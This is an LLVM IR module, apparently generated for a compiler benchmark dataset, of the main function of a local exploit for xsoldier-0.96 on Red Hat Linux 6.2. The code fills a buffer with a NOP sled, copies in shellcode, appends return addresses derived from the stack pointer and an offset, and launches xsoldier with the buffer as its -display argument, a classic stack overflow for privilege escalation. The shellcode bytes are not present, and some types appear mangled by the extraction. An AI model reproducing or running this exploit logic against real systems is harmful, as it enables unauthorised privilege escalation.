; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_229.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_229.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUFSIZE = common dso_local global i32 0, align 4
@OFFSET = common dso_local global i32 0, align 4
@blah = common dso_local global i32 0, align 4
@RANGE = common dso_local global i32 0, align 4
@NOP = common dso_local global i8 0, align 1
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [60 x i8] c"xsoldier-0.96 exploit for Red Hat Linux release 6.2 (Zoot)\0A\00", align 1
@.str.1 = private unnamed_addr constant [23 x i8] c"zorgon@antionline.org\0A\00", align 1
@.str.2 = private unnamed_addr constant [56 x i8] c"[return address = %x] [offset = %d] [buffer size = %d]\0A\00", align 1
@.str.3 = private unnamed_addr constant [11 x i8] c"./xsoldier\00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"xsoldier\00", align 1
@.str.5 = private unnamed_addr constant [9 x i8] c"-display\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = load i32, i32* @BUFSIZE, align 4
  %12 = zext i32 %11 to i64
  %13 = call i8* @llvm.stacksave()
  store i8* %13, i8** %6, align 8
  %14 = alloca i8, i64 %12, align 16
  store i64 %12, i64* %7, align 8
  %15 = load i32, i32* %4, align 4
  %16 = icmp sgt i32 %15, 1
  br i1 %16, label %17, label %22

17:                                               ; preds = %2
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 1
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 @atoi(i8* %20)
  store i32 %21, i32* %9, align 4
  br label %24

22:                                               ; preds = %2
  %23 = load i32, i32* @OFFSET, align 4
  store i32 %23, i32* %9, align 4
  br label %24

24:                                               ; preds = %22, %17
  store i32 0, i32* %8, align 4
  br label %25

25:                                               ; preds = %40, %24
  %26 = load i32, i32* %8, align 4
  %27 = load i32, i32* @BUFSIZE, align 4
  %28 = load i32, i32* @blah, align 4
  %29 = call i32 @strlen(i32 %28)
  %30 = sub nsw i32 %27, %29
  %31 = load i32, i32* @RANGE, align 4
  %32 = mul nsw i32 %31, 2
  %33 = sub nsw i32 %30, %32
  %34 = icmp slt i32 %26, %33
  br i1 %34, label %35, label %43

35:                                               ; preds = %25
  %36 = load i8, i8* @NOP, align 1
  %37 = load i32, i32* %8, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds i8, i8* %14, i64 %38
  store i8 %36, i8* %39, align 1
  br label %40

40:                                               ; preds = %35
  %41 = load i32, i32* %8, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %8, align 4
  br label %25

43:                                               ; preds = %25
  %44 = load i32, i32* %8, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds i8, i8* %14, i64 %45
  %47 = load i32, i32* @blah, align 4
  %48 = load i32, i32* @blah, align 4
  %49 = call i32 @strlen(i32 %48)
  %50 = call i32 @memcpy(i8* %46, i32 %47, i32 %49)
  %51 = call i64 (...) @get_sp()
  store i64 %51, i64* %10, align 8
  %52 = load i32, i32* %8, align 4
  %53 = load i32, i32* @blah, align 4
  %54 = call i32 @strlen(i32 %53)
  %55 = add nsw i32 %52, %54
  store i32 %55, i32* %8, align 4
  br label %56

56:                                               ; preds = %69, %43
  %57 = load i32, i32* %8, align 4
  %58 = load i32, i32* @BUFSIZE, align 4
  %59 = icmp slt i32 %57, %58
  br i1 %59, label %60, label %72

60:                                               ; preds = %56
  %61 = load i64, i64* %10, align 8
  %62 = load i32, i32* %9, align 4
  %63 = sext i32 %62 to i64
  %64 = add i64 %61, %63
  %65 = load i32, i32* %8, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %14, i64 %66
  %68 = bitcast i8* %67 to i64*
  store i64 %64, i64* %68, align 1
  br label %69

69:                                               ; preds = %60
  %70 = load i32, i32* %8, align 4
  %71 = add nsw i32 %70, 4
  store i32 %71, i32* %8, align 4
  br label %56

72:                                               ; preds = %56
  %73 = load i32, i32* @stderr, align 4
  %74 = call i32 (i32, i8*, ...) @fprintf(i32 %73, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str, i64 0, i64 0))
  %75 = load i32, i32* @stderr, align 4
  %76 = call i32 (i32, i8*, ...) @fprintf(i32 %75, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.1, i64 0, i64 0))
  %77 = load i32, i32* @stderr, align 4
  %78 = load i64, i64* %10, align 8
  %79 = load i32, i32* %9, align 4
  %80 = sext i32 %79 to i64
  %81 = add i64 %78, %80
  %82 = load i32, i32* %9, align 4
  %83 = load i32, i32* @BUFSIZE, align 4
  %84 = call i32 (i32, i8*, ...) @fprintf(i32 %77, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.2, i64 0, i64 0), i64 %81, i32 %82, i32 %83)
  %85 = call i32 @execl(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i64 0, i64 0), i8* %14, i32 0)
  %86 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %86)
  %87 = load i32, i32* %3, align 4
  ret i32 %87
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @strlen(i32) #2

declare dso_local i32 @memcpy(i8*, i32, i32) #2

declare dso_local i64 @get_sp(...) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
